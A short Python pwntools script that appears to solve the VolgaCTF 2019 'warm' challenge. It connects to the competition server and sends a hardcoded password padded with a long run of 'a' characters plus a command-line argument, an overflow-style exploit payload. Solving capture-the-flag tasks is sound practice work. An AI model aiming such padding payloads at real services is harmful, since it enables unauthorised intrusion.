from pwn import *
from sys import argv

io = remote('warm.q.2019.volgactf.ru', 443)
io.recv()
io.sendline('v8&3mqPQebWFqM?xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + argv[1])
io.interactive()
